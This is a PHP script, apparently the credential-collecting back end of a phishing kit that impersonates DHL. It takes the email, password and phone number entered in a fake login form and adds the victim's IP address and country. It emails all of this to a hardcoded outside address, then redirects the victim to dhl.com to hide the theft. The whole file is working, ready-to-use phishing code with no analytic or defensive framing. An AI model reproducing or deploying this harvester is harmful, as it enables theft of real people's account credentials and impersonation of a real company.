<?php

// Get client's IP address
if (isset($_SERVER['HTTP_CLIENT_IP']) && array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ips = array_map('trim', $ips);
    $ip = $ips[0];
} else {
    $ip = $_SERVER['REMOTE_ADDR'] ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;

$geopluginURL = 'http://www.geoplugin.net/php.gp?ip='.$ip;
$addrDetailsArr = unserialize(file_get_contents($geopluginURL));
$city = $addrDetailsArr['geoplugin_city'];
$country = $addrDetailsArr['geoplugin_countryName'];
$adddate=date("D M d, Y g:i a");
$message = "";
if(isset($_POST['email']) && isset($_POST['pass']) && isset($_POST['phone'])){

$loginemail = $_POST['email'];
$password = $_POST['pass'];
$phone = $_POST['phone'];


$message .= "--------------FORM DATA DHL 2024 -----------------\n";
$message .="Email : $loginemail\n";
$message .="Password : $password\n";
$message .="Phone : $phone\n";
$message .= "----------------IP Address & Date-----------------\n";
$message .= "IP: ".$ip."\n";
$message .= "..:: Client Country : $country\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Created in 2024 By BLOOD----------------\n";



$pfw_header = "From: DHL 2020 LOGZ<hidedomeki@blood.net>";
$pfw_subject = "DHL 2024 PackaG";
$pfw_email_to = "dr.barretdavid@gmail.com";
@mail($pfw_email_to, $pfw_subject ,$message ,$pfw_header );
}else{

    $message .= "----------------IP Address & Date-----------------\n";
    $message .= "IP: ".$ip."\n";
    $message .= "..:: Client Country : $country\n";
    $message .= "Date: ".$adddate."\n";
    $message .= "---------------Created in 2024 By BLOOD----------------\n";
    
    
  
}

header("Location: http://dhl.com");

?>
